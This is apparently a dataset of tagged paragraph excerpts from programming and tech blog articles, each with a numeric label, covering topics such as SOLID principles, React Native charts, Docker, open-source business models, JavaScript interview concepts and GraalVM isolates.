2323,"The Single Responsibility Principle (SRP) is one of the five so-called SOLID principles, developed and promoted by Robert C. Martin to help developers produce flexible and maintainable code. In short, the SRP says that a given module or class should have responsible for a single element of a programs functionality, and thus have just a single reason to change. The benefits of adhering to the SRP include: clearly defined boundaries as to where a piece of functionality is implemented; information-hiding practices that protect the integrity of data; separation of concerns that ensures changes in one location do not affect others; and, ease of code maintenance. In practice, it can be useful to think of your programs in terms of interested users and whether changes they request to one piece of functionality might inadvertently affect others. In the long run, following the SRP will both save you time and result in more effective code.","['Software Development', 'Programming', 'Coding', 'Learning To Code', 'Software']",10
2324,"This one I learned when learning how to coach competitive youth soccer teams. Start with something possible, good hustle on that play. Then mention something that needs improvement, that left foot pass could be a bit sharper. Then follow up with something positive, you maintained excellent field position on that attack. I learned that in order for the soccer player to actually hear the constructive criticism, they first had to be listening. Sharing something positive helped them to actually hear the suggestion and not just hear a complaint or disapproval.","['Articles', 'Presentations Skills', 'Soft Skills']",0
2325,"Scoping, prioritizing, and executing such work necessarily involves a high degree of coordination between and across teamsand that coordination takes time and effort. For organizations measuring each teams success by the operational speed of their work, this can create a glaring disconnect between the work that is most important to customers and the work that each small autonomous team is likely to prioritize. This ultimately begs the question: is autonomy really the goal we want to be working towards? Breaking down big products into small, manageable pieces is no easy taskbut putting those pieces back together, it turns out, is much more difficult. Many scaled Agile frameworks are designed in part to balance small-scale autonomy with big-picture coordination. But the most important step towards keeping small teams connected and coordinated, as I discovered while researching my latest book Agile for Everybody, is less a matter of org charts and frameworks than one of collaboration and culture. As Spotify VP of Growth and Marketing Mayur Gupta told me: In other words, simply redrawing your org chart to follow The Spotify Model (or any model for that matter) will not actually recreate the culture that has led Spotifyor any of those best-in-class companies to achieve its biggest wins. Rather than following a single ready-to-adopt operational model, nearly every success story I heard when researching Agile for Everybody followed three high-level guiding principles: Starting with customers and their needs, not with a company-centric goal Collaborating early and often across multiple teams (regardless of how those teams are formally organized), to identify big opportunities as well as tactical dependencies Planning for uncertainty to actually incorporate new information as a project progresses Teams and organizations that had truly embraced these principles were able not only to break down big challenges into smaller pieces, but also to dynamically rethink how those pieces fit back together. Their goal was not to achieve operational speed or pure autonomy, but rather to work together towards solving the biggest and most important problems facing their customers.","['Agile', 'Product Management', 'Product', 'Technology', 'Leadership']",1
2326,"Recently I was looking for a React Native graph library for my S __url__ app. During the research, I realized its not easy to deal with graphs in React Native. And if you want to animate them? The following gif is what I have done and will talk about in this tutorial! When I was doing my research about charts in React Native, I found out that almost everyone uses the ART library. Which is really cool and powerful drawing library. Look at this pie chart that has been done by ART library for the S __url__ app.","['React Native', 'JavaScript', 'Graphic Design', 'Design', 'React']",19
2327,I decided to make every single column separately as a component. So I could add a delay effect. You can see that the animation starts randomly for every single column when the graph is changing a position of baseline. Lets work with the 200 height. Values height could be 25 and labels height 25 as well.,"['React Native', 'JavaScript', 'Graphic Design', 'Design', 'React']",14
2328,"If the graphs height is 150 then the columns height is 300. Every column has a positive part (A) and a negative part (B). Opposite side of these parts is always hidden. The A is hidden for the negative part and the B is hidden for the positive part. It means that if we move the positive part (A) underneath of baseline to the B space, the positive column will be completely hidden. Thats what we want when the value is negative.","['React Native', 'JavaScript', 'Graphic Design', 'Design', 'React']",14
2329,"I used my open source library called react-native-motion and component Translate Y. Which makes animations really easy to implement. We use Translate Y component in the same way as we would use View component. The only thing we need to do is compute Y positions for positive column, negative column, baseline, and a value label.","['React Native', 'JavaScript', 'Graphic Design', 'Design', 'React']",14
2330,"Check the result in a real application. S __url__ already implemented the column chart. As I said before, everything is done by UI thread (its pretty fast). There is an on Press event so you can change the months. When you select the category it will change the values of a graph and recomputes Y positions. Then the react-native-motion takes care of animation.","['React Native', 'JavaScript', 'Graphic Design', 'Design', 'React']",14
2331,So I use React Natives Animated API even for the number animation. We can add a listener to animated value and when the value is changed we just re-render the number. Its easy and you can take advantage of the Animated API. By using an Easing for example. I put the component to the react-native-motion library which is open-sourced for you guys You just have to write a couple of lines like this. Once the value is changed in your code it will take care of the rest.,"['React Native', 'JavaScript', 'Graphic Design', 'Design', 'React']",15
2332,"Inspiration Research: The environment and level design will be inspired by Bills Town level in The Last of Us. Bills Town was very much focused on the first half of the level on the exploration of Bills Town. In doing so, we get small hints on the past of Ellie and Joel, as well as what they like to do. At this point in the story, Joel is warming up to Ellie, but still has major reservations about her. This level also had a lot of blockades that showed the players objective beyond a big obstacle. This obstacle either required the player to find another way or use a ladder/plank to traverse the obstacle. There was also a lot of time to show and tell about what happened during and after the outbreak. The Last of Us uses a lot of light, color, and distant objects to orient the player in the right direction.","['The Last Of Us', 'The Last Of Us Part Ii', 'Level Design', 'Video Game Development', 'Games']",14
2333,"Environments: Small Corridor/Alley This is where the player starts the level. This location was picked so that the surroundings would be masked by the buildings ceiling or the seats at the Memorial Stadium. Once the player enters the stadium, they will get a good look at the objective (the Space Needle), and the pathway towards it. In addition, it gives the player to try out the first puzzle without being distracted by enemies or environmental storytelling. This would be a good time to learn about what Ellie is doing here. The story is that she has evidence to believe that there is a firefly survivor who survived Joels attack from the first game. She believes that this survivor is somewhere near the Space Needle.","['The Last Of Us', 'The Last Of Us Part Ii', 'Level Design', 'Video Game Development', 'Games']",14
2334,"The International Fountain The objective of this part of the level was to introduce the threat. Initially, I did not plan to add AI, but from popular demand from playtesting, I added simple AI and stealth to give the player an idea of the situation of the level. Here was just a simple introduction on the antagonists without giving a thorough explanation on who they are. They are just dangerous people on patrol. In terms of the environment, the idea was to have the whole area sunk. Throughout time and neglect, the entire fountain would collapse in on itself and affords for the player to find a way through.","['The Last Of Us', 'The Last Of Us Part Ii', 'Level Design', 'Video Game Development', 'Games']",14
2335,"The Childrens Museum At this moment we are introduced to the antagonists, who are cultists. The cultists believe that the cordyceps infection was meant to be the apocalypse and that the fireflies and military who are trying to save humanity are imposing on the will of God. At this point, we see that the fireflies did have a base here, but Ellie was too late. Cultists arrived first, and it is a bloodbath. We also reach a point of no return so that Ellie cannot retreat and must go forward. This environment should tell a gruesome story of what just happened to the fireflies.","['The Last Of Us', 'The Last Of Us Part Ii', 'Level Design', 'Video Game Development', 'Games']",5
2336,"The first thing to note is that the layout of the level changed from its initial design. Initially, it was focused on the accuracy of real life, but I realized several issues. One, the objective was always outside the players view. Third, it was not complementing the story I wanted to tell with this design. With that, I decided to take an inspired approach. This forced the level to focus on going one direction the majority of the time (towards the Space Needle) and removing huge parts of the stadium, museum, and other locations.","['The Last Of Us', 'The Last Of Us Part Ii', 'Level Design', 'Video Game Development', 'Games']",14
2337,"Naughty Dog are masters in design, and it was interesting to conduct research on The Last of Us. In this level, I tried to keep the sense of scale to everything making the player feel small in this big and unforgiving world. The lighting helps guide the player towards their objective. The engagement curve and force of antagonism has the purpose to make the player feel like they shouldnt be there. I found it very challenging but also very fun. In fact, one day it would be cool to finish it and even add some more elements to it. Feel free to watch the final version of the level below and let me know if you have any notes. You can also visit my online site here or my Instagram here.","['The Last Of Us', 'The Last Of Us Part Ii', 'Level Design', 'Video Game Development', 'Games']",14
2338,"Theres a lot going on in the above Dockerfile. Lets break it down.13: Weve seen these lines before. Line 1 tells Docker to use the golang base image. Line 2 adds the working directory to the image. Line 3 sets the working directory inside the container.4: This line has changed slightly. In the previous example this line was split into two lines. In this example Ive merged the two. This is because Docker creates a new layer in the final image for every RUN, ADD and COPY instruction. Docker has published an article about best practices which has a section about minimising the number of layers.","['Docker', 'Go']",7
2339,"Were now retrieving dependencies and compiling our software with the same Dockerfile instruction. CGO_ENABLED=0 tells the Go compiler to disable support for C code linking. This is required since the scratch image were planning to use contains no system libraries.6: This line creates a new build stage, based from the scratch image. scratch is a reserved single-layer image. You can think of scratch as an empty image.7: This line simply adds the maintainer tag to the final image.89: These lines use the COPY instruction to extract files from the first stage in the Dockerfile (--from=0). Line 8 copies the compiled Go binary. Line 9 copies the ca-certificates (since these dont exist in the scratch image).10: This line adds runtime dependencies that werent necessary at compile time. In this example these are __url__ files.11: This line tells Docker that the container listens on port 8080, but doesnt actually publish the port. See the Dockerfile reference for more information.12: This line sets the working directory inside the container.13: This line tells Docker what the container should do at runtime. In this example we want to run the server binary.","['Docker', 'Go']",18
2340,"(Go with me, I promise Ill bring it back around.) It looks like this: Long story short, I have this tattoo because it reminds me that I have things that I value. In my heart, I believe that the person I am values those things in a kind of internal stack rank: I would never want to hurt my family because I value my work, for example. The lines remind me that I need to stop and consider my own actions.",['Open Source'],4
2341,"It also reminds me that we often fail to do that. Everyone has that list, and everyone fails that list at some point in their lives. I am lucky enough to have people in my life who know my valuesthey know what that list is for me. They love me enough that when I fail those values, they tell me so: and they love me regardless. Its a kind of grace that I know I need, and that I know others need. The lines remind me to try and search for those values in others, and attempt to give them that grace.",['Open Source'],4
2342,"I also know you value building businesses with strong, protected revenue streams. In Salils case I know that because he is a venture capitalist, and a good one, and you dont get to be a good venture capitalist and not care about those things. My own life is orders of magnitude better for the existence of my venture backers in itnot only for their capital, but their advice, their clarity, and their wisdom. In the case of the entreprenuers involved in making these decisions for their companies, I know because I am one. I know how much stress and uncertainty and worry eats at your gutsthat the business will fail, that these people who believe in you wont have jobs anymore, that the thing you believe the world needs wont come to being.",['Open Source'],12
2343,"At the heart of the non-compete software movement is the fervent desire to keep the upside of being an open source community, without compromising the ability to capture revenue. It says: We share the right to use the software, to improve the software, and to extend that software As long as you do not compete with my commercial ambition It starts by affirming your rights. Its better to have software that I can improve or extend. Then comes the kicker: part of the community (the business part) only extends those rights to you if you are willing to support their commercial ambition with your efforts.",['Open Source'],16
2344,"Since the early 90s, and primarily driven by Linux, there has gradually been a mental shift among those in the high-scale computing industry: proprietary software should be avoided at all costs. Open software quality has vastly increased over time. This is a key and subtle point. As mentioned briefly above, the origins of the modern free software movement were driven primarily by hobbyists and professional developers donating their time during nights and weekends. From a quality and functionality perspective, how could this group compete with Microsoft, Apple, Oracle, IBM, and others during the 80s and early 90s? However, the late 90s brought with it Yahoo, Amazon, and Google. The 00s brought Facebook, Twitter, and others. In short, starting in the late 90s, massively successful companies that were not directly generating revenue from software or hardware started driving forward many of the most popular free software projects by hiring professional developers (often from Microsoft, Apple, and other proprietary software companies) and putting them to work full-time on OSS projects. Thus, over time, the workforce contributing to the most popular free software has gradually shifted from hobbyists to well paid and highly skilled professional programmers subsidized by the profits of Internet companies.",['Open Source'],16
2345,"What if a proprietary software company goes out of business? How will users continue to make changes to meet their business needs? What if users need to make a change that the company does not feel is valuable and refuses to prioritize? As computing has shifted progressively away from shrink-wrapped software to services, often run across thousands or even millions of computers, the largest Internet companies do not want to be locked-in to per-node, per-CPU, etc. pricing for critical systems that they depend upon such as hypervisors, operating systems, databases, load balancers, etc.",['Open Source'],16
2346,"The computing industry has gradually shifted from generating revenue directly from software to generating revenue from value added services built on top (often supported by advertising). This is not to say that propriety software no longer exists. Clearly it does in the form of consumer applications (games, Windows, OSX, Android, apps, etc.). In the enterprise space it also still exists in the form of line of business applications (although I would argue that most large LOB applications are now custom developed in-house by the company that needs them). However, when focusing on the infrastructure (cloud) computing space, there is a dogmatic feeling throughout the industry that core tooling such as compilers, operating systems, databases, load balancers, etc.",['Open Source'],16
2347,"As described above, companies like Amazon, Google, and Facebook do not believe in using proprietary software for critical infrastructure computing functions. In addition to bolstering previously existing OSS, they have also started many critical projects and released them as OSS. Isnt the software they develop a competitive advantage even if not domain specific? Lets be clear that Internet mega-companies do not do anything out of goodwill (Google for example is notorious for releasing whitepapers about internal infrastructure technologies but not the software itself). Releasing OSS is a calculation that incorporates recruiting (developers want to work on OSS as it gives them industry visibility), technical credibility (helps with recruiting and the perception of the company as a technical powerhouse), and platform building (the industry orienting around a set of OSS technologies driven by an Internet giant provides a substantial advantage when offering related cloud computing products).",['Open Source'],16
2348,Internet mega-companies are subsidizing OSS creation with their primary revenue generation stream.,['Open Source'],16
2349,"This is where things start to get interesting. There is no single definition of open core. After the initial Redis story broke, Salvatore Sanfilippo (creator of Redis) wrote a blog post laying out his case that Redis had not switched to an open core model. His argument can be reduced to the fact that Redis is a modular system, and that only modules developed by Redis Labs would be under a commercial license. The Redis core will remain fully open. He goes on to write: At a high level, I agree with Salvatore that this is the most basic definition of open core, however, I do believe that Redis Labs has fundamentally switched to an open core business model, and the implications of this switch are subtle and gradual.",['Open Source'],10
2350,"Whether an OSS project is modular or chooses to release commercial/enterprise closed source builds with extra features, there are some fundamental problems with the pure open core model: Open core is at odds with the OSS community. What happens when a community member wants to contribute a feature/module that competes with the enterprise offering? How should the company handle that situation? If they refuse to take the contribution they alienate the community. If they take the contribution they cannibalize their own business model.",['Open Source'],16
2351,"Although its been implied throughout this post, it should be explicitly stated that many (most?) software build versus buy decisions are subjective and made without any real data. All too often, potential customers feel that infrastructure software should be free, and grossly underestimate the true cost of running a piece of software over time, when taking into account both CAPEX and OPEX. Theoretically, the CAPEX for OSS is $0. How many engineers will have to be employed to run the software and debug it? What features will have to be added to an unfamiliar code base? What additional ancillary management systems, UIs, etc. will need to built such that the software can be consumed by the rest of the organization? If our industry was better at analyzing true TCO, I fully believe that making money off of OSS would be substantially easier. The experts in the software would be able to easily charge substantial per-node licensing fees in exchange for continued feature development and support to all but the largest enterprises and cloud providers. The fact that the software is free would really just be an insurance policy in case the company goes out of business.",['Open Source'],12
2352,"In the future, I believe the most successful OSS projects will be primarily monetized via this method. The idea behind loose open core and Saa S is that a popular OSS project can be developed as a completely community driven project (this avoids the conflicts of interest inherent in pure open core), while value added proprietary services and software can be sold in an ecosystem that forms around the OSS. What are some examples of such services and software? Modern cloud native infrastructure software is robust, but typically configured via a giant pile of YAML. Custom UIs that allow organizations to manage configurations are extremely powerful. When coupled with RBAC, version control, etc.",['Open Source'],16
2353,"I had an interesting insight recently: I dont think there is a one-size-fits-all business model for every OSS project. In fact, I think the best business model is dependent on the projects popularity and might change over time. For new projects being built with VC funding or by hobbyists, and without the ability to battle-test the software in the production environment of a large Internet company, the larger software community will remain skeptical of project quality for quite some time. These projects need to get a toehold in production wherever they can, and initially will rely on word of mouth, conference talks, Twitter, Hacker News, etc. As a project gains some traction, I think its perfectly reasonable to target a pure open core business model coupled with services and support in order to fund continued development (of course loose open core and Saa S are fine too but might require more development resources than the startup has). In fact, at this stage, I would argue its more likely that some small number of early adopters will pay for a pure open core product and/or a services and support contract, satisfying the relatively small amount of growth that VCs want to see during early funding rounds.",['Open Source'],16
2354,"One possible solution to this problem is for the various OSS foundations to step up and start providing fellowships to key maintainers. The foundations already raise substantial amounts of money from members to support their activities. Its a natural progression for the foundation to raise money directly for fellowships to support the work of key maintainers on key projects. And I think it is a win-win for everyone involved. Here is why: By allowing key maintainers to stay independent, it becomes much more likely that a projects community remains robust and does not favor any individual corporate entity. This creates a larger community and a more vibrant ecosystem for loose open core and Saa S companies to be built on top.",['Open Source'],12
2355,"Its very difficult to foresee how the future of revenue generating OSS is going to play out over the next 1020 years. Will most core infrastructure software be subsumed by the large clouds making all of this a moot point? Will VC-backed OSS startups continue to find success operating independently? In any case, the march of OSS across the industry will not stop, that is a given. Because of this, as an industry, we are going to have to come to terms with the economic reality: nothing is free, including OSS. If we want vibrant OSS projects maintained by engineers that are well compensated and not conflicted, we are going to have to decide that this is something worth paying for. In my opinion, fellowships provided by OSS foundations and funded by companies generating revenue off of the OSS is a great way to start down this path.",['Open Source'],16
2356,"The Java Script(JS) interviews are not easy. I accept it, you accept it and, everyone does. The number of possibilities of questions could be asked in a Java Script interview are high. How one will be able to crack a JS interview? This article is an effort to instruct all aspiring Java Script developers to deepen their JS knowledge by knowing the fundamental concepts. These are baby steps to be taken at least to face a JS interview. If I am a candidate, I prepare for these concepts well. If I am an interviewer, I presume you know these vital things to proceed further.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",2
2357,"This guide is a beginning point but not nib for a JS developer. It is his/her responsibility to prepare themselves for much tougher interviews. They also need to keep in mind that interview questions can also be from the domain and technologies they worked(Ex: React JS, Web Pack, Node JS etc). Here we present the basic JS elements you should be well versed to call yourself as a good Java Script developer. A fine JS developer can be a fine React developer, but the reverse is not guaranteed. Sadly, JS has a bad reputation for producing countless script kiddies with lack of discipline(partially true). Java Script allows developers to do things without complaining much. It is fun to code too. Few great Java Script programmers like John Resig (creator, j Query), Brendan Eich(creator, JS) and, Lars Bak(Google Chrome team) understood the language in and out. A successful JS programmer always reads the plain JS code from libraries. Many say it is really hard to find a good Java Script developer! In order to show you the complexity of JS interviews, in the first look, try to find out the outcome of this JS statement.<<<<<<<<<<<< >>>>>>>>>>>>><<<<<<<<<<<< >>>>>>>>>>>>><<<<<<<<<<<< >>>>>>>>>>>>>(These lines are to make you not focus on the below lines)9 people out of 10 says this prints false.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",19
2358,"Functions are the cream of Java Script. They are the first class citizens. Without knowing JS functions in depth, your knowledge is severely caveated. A JS function is more than a normal function. Unlike in other languages, a function can be assigned to a variable, passed around as an argument to another function and can also be returned from another. Hence, it is the first class citizen in the JS.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",9
2359,"While submitting second code samples, you found in guidelines that professor asked you to use constant pi with 5 decimals precision. You just used 3.14, not 3.14159. Now you have no chance to send library as the deadline was over. Just call your code in this wayand it takes your new pi value on the fly. The output is Which makes your professor happy! If you observe the call function takes two arguments: Context Function arguments A context is an object that replaces this keyword inside the area function. Later arguments are passed as function arguments. For Ex: Call invocation is like this Did you see those function arguments are passed as subsequent arguments after context object.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",3
2360,"Here, the scope is playing an important role. A closure is a function that returns another function and wraps data. The above string generator qualifies for a closure. The index value is preserved between multiple function calls. The internal function defined can access the variables defined in the parent function. If you defined one more function in the second level function, that can access all parents variables.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",15
2361,"We are not assigning name and type in the child function, we are calling super function Animal and setting the respective properties. The pet is having the properties(name, type) of the parent. It happens because we didnt say Java Script to inherit the parent class methods. We can check what is the class of given object in Java Script using the object.constructor function. Let us check what is the class of our pet.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",15
2362,"Callbacks are the functions those executed after an I/O operation is done. A time taking I/O operation can block the code not allowing further execution in Python/Ruby. But in Java Script, due to the allowed asynchronous execution, we can provide callbacks to the async functions. The example is an AJAX(XMLHttp Request) call from the browser to a server, events generated by the mouse. Example is Here req Listener is the callback which will be executed when a GET request to is successfully responded back.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",3
2363,Functional programming is a discussion topic these days. Many programming languages are including functional concepts like lambdas into their newer versions (Ex: Java >7). In Java Script support for functional programming constructs exists for a long time. There are three main functions we need to learn deeply. Mathematical functions take some input and return output. A pure function always returns the same output for the given input. The functions we discuss now also satisfy the purity.,"['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",9
2364,"Reduce function reduces a given list to one final result. We can also do the same thing by iterating the array and saving the intermediate result in a variable. But here this is a cleaner way to reduce an array to a value. The general syntax for JS reduce operation is: The accumulator stores the intermediate and final value. The current Index, current Value are index, value of the element from the array respectively. initial Accumulator Value passes that value to accumulator argument.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",3
2365,"One practical application for reduce can be flattening an array of arrays. Flattening is converting internal arrays to one single array. For Ex: We can achieve this by normal iteration. But using reduce, it is a straight code. This is the third type of functional programming concept. It is close to map as it also processes each element in the array and finally returns another array(not returning a value like in reduce). The length of the filtered array can be less than or equal to the original array. Because the filtering condition we pass may exclude few/zero inputs in the output array. The general syntax for JS filter operation is: Here elem is the data element of the array and true/false should be returned from the function to indicate inclusion/exclusion of filtered element. The common example is to filter the array of words which starts and ends with given conditions. Suppose, we should filter an array of words which starts with t and ends with r.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",3
2366,"In Java Script whenever we code casually, things may fail. For Ex: Here, we are falling into the trap saying results always will be a JSON object. Sometimes the server can crash and a null will be returned instead of the result. In that case, null[posts] will throw an error. The proper handling could be this! The log Error function is intended to report the error back to the server. The second function flash Info Message is the function that displays a user-friendly message like Service unavailable currently etc.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",3
2367,"Nicholas says manually throw errors whenever you feel something unexpected is going to happen. Differentiate between fatal and non-fatal errors. The above error is related to the backend server going down which is fatal. There, you should inform the customer that service is down due to some reason. In some cases, it may not be fatal but better to notify sever about this. In order to create such code, first, throw an error, catch it with error event at window object level, then make an API call to log that message to the server.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",13
2368,"Always think how to handle the errors, not in the browser but yourself. All the above concepts are primary for a Java Script developer. There are few internal details to know those can be really helpful. Those are how Java Script engine works in the browser. What are Hoisting and Event Bubbling? Hoisting is a process of pushing the declared variables to the top of the program while running it. For Ex: When you do above thing in a scripting language like Python, it throws an error. You need to first define and use it. Even though JS is a scripting language, it has a mechanism of hoisting. In this mechanism, a Java Script VM does two things while running a program: First scan the program, collect all the variable and function declarations and assign memory spaces for it.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",9
2369,"Run the program now by filling variable values assigned any, if not, fill undefined In the above code snippet, __url__ prints undefined. It is because in the first pass variable foo is collected. VM looks for any value defined for variable foo. This hoisting can result in many Java Script code situations where code can throw errors in some places and uses undefined silently in another. You should be knowing hoisting to clear the ambiguity! According to Arun P, a senior software engineer: With bubbling, the event is first captured and handled by the innermost element and then propagated to outer elements. With capturing, the process is in reverse. We usually attach an event to a handler using the add Event Listener function.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",3
2370,"These are the basic concepts in Java Script. As I initially mentioned, additional to them, your work experience and knowledge, preparation helps you crack a Java Script interview. Keep an eye on the latest developments(ES6). Dig deeper into various aspects of Java Script like V6 engine, tests etc. Here are a few video resources that will teach you many things. Finally, no interview is successful without mastering Data structures & Algorithms. Oleksii Trekhleb curated a wonderful git repo that consists all interview preparation algorithms with JS code.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",19
2371,"If you like this article, thanks! You can follow me at @ayyubrazazain Inheritance in Java Script This article has covered the remainder of the core OOJS theory and syntax that we think you should know now. At thisdeveloper.mozilla.org Object.prototype.constructor Returns a reference to the Object constructor function that created the instance object. Note that the value of thisdeveloper.mozilla.org Using XMLHttp Request To send an HTTP request, create an XMLHttp Request object, open a URL, and send the request. After the transactiondeveloper.mozilla.org Regular Expressions Regular expressions are patterns used to match character combinations in strings. In Java Script, regular expressionsdeveloper.mozilla.org What is event bubbling and capturing? What is the difference between event bubbling and capturing? Of the two, which is the faster and better model to use?stackoverflow.comganqqwerty/123-Essential-Java Script-Interview-Question123-Essential-Java Script-Interview-Question Java Script interview Questionsgithub.com.","['JavaScript', 'Interview', 'Software Developer', 'Software Engineering', 'Javascript Interview']",15
2372,"Cloud Former isnt a first-class AWS service in the sense that you cant navigate to it via the Services drop-down and it wont appear if you try to search for it in the Find a service by search bar, either. If your Cloud Formation looks bare (in your region), you will just be able to select Cloud Former. If you already have stacks in your region, select Create Stack and then choose Cloud Former (under Tools) from the Select a sample template drop-down. Confusingly enough, in order to use Cloud Former (to ultimately create stacks of infrastructure) you must first create a stack for Cloud Former itself, hence the use of the generic stack creation wizard. (This feels to me like an unnecessary overhead that AWS could have avoided and maybe it will change if Cloud Former ever gets a full release but I couldnt find any official information on the matter. )Give your stack a name and choose a username and passwordyou will need these to log into your Cloud Former EC2 instance. This may seem like overkill for what were trying to achieve (and it may well be) but dont worry, your EC2 instance only needs to be running for a few minutes while Cloud Former reverse engineers Cloud Formation templates for the resources you select. According to the AWS documentation: If youre just playing around with AWS and dont have much in your account, youre probably fine to just use the default VPC but if thats not the case, you should create a new VPC in which your Cloud Former stack will be located.","['AWS', 'Cloudformation', 'Cloudformer', 'Route 53']",11
2373,"Graal VM provides yet another kind of virtualization we call language-level virtualization, that allows multiple languages to run in the same process (or thread). It provides another level of write-once, run-anywhere by allowing a library written in one language to be called directly from another language without performance penalties. The news today is that Graal VM now also provides a way to use hardware resources even more efficiently by allowing multiple applications to share the language runtime (eg. This can be important in cloud environments or other environments where packing more tenants per server can directly reduce infrastructure costs. Over time, we expect Graal VM to continue to blur the line between Java-style and OS-level virtualization.",['Programming'],10
2374,"While that all sounds great, there are some important limitations with isolates to be aware of. First, they are a low-level feature designed to be used by a higher level technology that manages tasks (like a database or a serverless cloud). In the database, for example, we will use an isolate for the Graal compiler to put its own objects and another isolate for the application data. Second, isolates dont yet include features like snapshots that one would expect from a full-fledged virtualization technology. Finally, isolates and compressed pointers are only available when using Substrate VMthey dont apply when running Graal VM embedded in the Java Hot Spot VM (which has its own ideas about heap management). Isolates are available in any edition of Graal VM, but compressed pointers are only available in the Enterprise Edition.",['Programming'],10
2375,"The class Isolates contains the API to manage the isolates. Here are some important methods for controlling the life cycle of an isolate: The method create Isolate() creates and initializes a new independent VM instance. The Java heap of the new isolate consists only of the image heap, i.e., objects of the calling isolate are not available in the new isolate. The current thread is attached to the new isolate, and the Isolate Thread descriptor is returned to the calling isolate. We can now invoke methods in the new isolate, more on this later. The method tear Down Isolate() discards an isolate. Among other things, it frees all memory associated with the isolate by returning it to the operating system - there is no garbage collection necessary for that.",['Programming'],3
2376,"It is now time to introduce our running example for this article. We are using the Netty web server to respond to web requests to plot functions. The function is provided by the user in the http request. The http response is a Scalable Vector Graphics (SVG) object. We use exp4j for expression evaluation and SVGGraphics2D for SVG file rendering. Both expression evaluation and rendering allocate temporary Java data structures, and we know all of these objects are unreachable after the request has been processed. But a traditional Java VM still needs an expensive garbage collection to eventually discard these temporary objects. The http requests are also coming from different users. Without a complete code review of all libraries that we depend on, we do not know if there are any global data structures or caches that could allow one user to observe properties of other users' expressions. In the request handler, we create a new isolate for each request and tear down the isolate after expression evaluation: Now we need to add the invocation of the actual rendering function. This is a little bit more complicated than a normal Java method invocation: We need to leave the Netty isolate (the default isolate that was created automatically at application startup) and enter the rendering isolate (the new isolate that we explicitly created). And since the heaps of the two isolates are completely separated, we cannot pass Java objects directly. The argument function string is an object in the Netty isolate, so the rendering isolate cannot access it. We first need to copy the string into the rendering isolate. The same holds for the return value: we cannot return a Byte Buffer Java object directly. We can only pass handles to Java objects. A ""handle"" is an opaque indirection to a Java object. The object that the handle refers to can only be accessed in the isolate in which the object and handle were created.",['Programming'],15
2377,"As you can see, in any given thread at most one isolate is active at any given point in time. The following figure visualizes the stacks. Assume that there are two rendering isolates active in two different request handler threads: All threads start out in C code for the thread start routines (pthreads functions on Linux). The Netty isolate starts all the request handler threads, so frames that belong to the Netty isolate are on all request handler threads. The last frame is for the method plot As SVGIn Isolate(). Each transition (entering or leaving an isolate) results in a transition frame. The first frame after the transition frame in the rendering isolate is for the method plot As SVG().",['Programming'],3
2378,"How do isolates impact the memory footprint of our application? To evaluate that, we send the request to plot a function repeatedly, and print the resident memory set size after each request. We use the Linux command pmap -x processid to query the memory size. The following figure shows the results with and without isolates for 50 requests: The first data point is the memory footprint after the startup of Netty, before serving any request. Every request allocates about 1.8 MByte of Java objects. Without isolates, these objects are not freed immediately, but fill the young generation of the heap. When the young generation is full, the garbage collector runs and frees the objects. For this benchmark, we fixed the young generation size to 80 MByte. This limit is reached at request #39. After the garbage collection during this request, the young generation starts out empty again and is filled up. As an optimization, the memory is not returned to the operating system immediately, therefore the resident memory set size remains high but does not grow linearly as before. But approximately every 40 requests, a garbage collection is necessary.",['Programming'],3
2379,"Each isolate has its own copy of the image heap. Remember that the image heap is prepared at build time, i.e., during image generation. We can use this functionality to avoid the execution of initialization code at run time. In our example, the function rendering code uses an instance of the class SVGGraphics2D for rendering. In a traditional Java execution, this object cannot be a singleton: multiple requests can be handled at the same time in different threads, i.e., multiple instances are in use at the same time and all instances are in the same heap, and it is necessary to allocate a new instance at run time: In our isolate-based model, each rendering is performed in a separate isolate. This means that only a single instance of SVGGraphics2D exists per isolate. We can therefore have a singleton instance, and we can allocate and initialize the singleton during image generation. The isolate starts up with the instance already being present on the image heap, and no allocation and initialization at run time is necessary. Note that in this case SVGGraphics2D is not a large data structure so the savings are modest, but there are many use cases where you can prepare much larger data structures during image generation.",['Programming'],3
2380,"The example is based on the Netty example that we introduced in an earlier article. The complete source code of this example is available in the Graal VM-demos repository on Git Hub in the folder native-netty-plot. To run it, you need Graal VM 1.0 RC9 or a later version. Graal VM comes in two variants: the open-source Community Edition and the commercial Enterprise Edition (which you can download for free for evaluation purposes). Isolates are available in both editions, but the compressed references introduced later in this article are only available in the Enterprise Edition. Therefore, we recommend using the Enterprise Edition to run this example.",['Programming'],18
2381,"Isolates are supported both on Linux and Mac OS, but our Mac OS implementation is less optimized. Creating a new isolate always copies the image heap on Mac OS as opposed to mapping from the image file as is done on Linux and therefore takes a bit longer. We are working on full support for Mac OS too, stay tuned! In this article, we looked at two advanced features on the Graal VM native images: more flexible memory management with isolates and reducing memory footprint of native images with compressed references. Both are available in the recent release of Graal VM, so if you want to experiment with these, grab the binaries from the website, and give it a go. Note that these are advanced features, so if you have not tried building native images before, their true benefits might be less obvious. But if you want to secure parts of the memory of your application or implement a computation that will produce a lot of objects which you can release as a whole, or you want to split your application memory into individual chunks based on some external limits, isolates can be there to save the day. Compressed references give you smaller memory footprint at no cost, which is particularly exciting for platforms where memory footprint is crucial.",['Programming'],7
